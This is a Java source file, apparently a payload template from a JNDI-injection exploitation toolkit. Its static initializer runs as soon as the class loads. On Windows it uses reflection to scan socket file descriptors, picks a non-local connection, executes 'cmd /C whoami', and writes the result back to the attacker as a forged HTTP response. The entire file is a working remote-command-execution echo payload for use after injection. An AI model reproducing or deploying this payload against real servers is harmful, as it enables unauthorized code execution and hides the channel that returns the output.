package com.qi4l.jndi.template.echo;

public class WindowsEcho {

    static {
        try {
            if(java.io.File.separator.equals("\\")){
                java.lang.reflect.Field field = java.io.FileDescriptor.class.getDeclaredField("fd");
                field.setAccessible(true);

                Class clazz1 = Class.forName("sun.nio.ch.Net");
                java.lang.reflect.Method method1 = clazz1.getDeclaredMethod("remoteAddress",new Class[]{java.io.FileDescriptor.class});
                method1.setAccessible(true);

                Class clazz2 = Class.forName("java.net.SocketOutputStream", false, null);
                java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[0];
                constructor2.setAccessible(true);

                Class clazz3 = Class.forName("java.net.PlainSocketImpl");
                java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(new Class[]{java.io.FileDescriptor.class});
                constructor3.setAccessible(true);

                java.lang.reflect.Method write = clazz2.getDeclaredMethod("write",new Class[]{byte[].class});
                write.setAccessible(true);

                java.net.InetSocketAddress remoteAddress = null;
                java.util.List list = new java.util.ArrayList();
                java.io.FileDescriptor fileDescriptor = new java.io.FileDescriptor();
                for(int i = 0; i < 50000; i++){
                    field.set((Object)fileDescriptor, (Object)(new Integer(i)));
                    try{
                        remoteAddress= (java.net.InetSocketAddress) method1.invoke(null, new Object[]{fileDescriptor});
                        if(remoteAddress.toString().startsWith("/127.0.0.1")) continue;
                        if(remoteAddress.toString().startsWith("/0:0:0:0:0:0:0:1")) continue;
                        list.add(new Integer(i));

                    }catch(Exception e){}
                }

                for(int i = list.size() - 1; i >= 0; i--){
                    try{
                        field.set((Object)fileDescriptor, list.get(i));
                        Object socketOutputStream = constructor2.newInstance(new Object[]{constructor3.newInstance(new Object[]{fileDescriptor})});
                        String[] cmd = new String[]{"cmd","/C", "whoami"};
                        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next().trim();
                        String result = "HTTP/1.1 200 OK\nConnection: close\nContent-Length: " + (res.length()) + "\n\n" + res + "\n\n";
                        write.invoke(socketOutputStream, new Object[]{result.getBytes()});
                        break;
                    }catch (Exception e){
                        //pass
                    }
                }
            }
        } catch (Exception ignored) {
        }

    }

}
